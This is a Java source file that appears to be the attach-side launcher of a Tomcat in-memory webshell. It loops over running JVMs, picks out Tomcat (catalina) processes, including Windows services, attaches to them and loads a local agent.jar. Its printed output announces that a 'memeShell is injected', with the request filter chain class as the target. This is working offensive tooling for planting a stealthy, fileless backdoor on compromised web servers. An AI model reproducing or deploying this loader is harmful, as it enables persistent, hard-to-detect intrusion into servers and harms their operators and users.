package com.agentmem;

import java.io.File;
import java.util.List;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;


public class Attach
{
    public static String className = "org.apache.catalina.core.ApplicationFilterChain";
    public static void main( String[] args ) {
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        System.out.println(currentPath);
        String agentFilePath = currentPath + "agent.jar";
        File agentFile = new File(agentFilePath);

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {
                    if (vmd.displayName().indexOf("catalina") >= 0 || vmd.displayName().equals("")) {
                        vm = VirtualMachine.attach(vmd);

                        //ADD for tomcat "windows" service,dispayname is blank string and has key "catalina.home".
                        if (vmd.displayName().equals("") && vm.getSystemProperties().containsKey("catalina.home") == false)
                            continue;

                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        if (null != vm) {
                            vm.loadAgent(agentFile.getAbsolutePath(), currentPath);
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
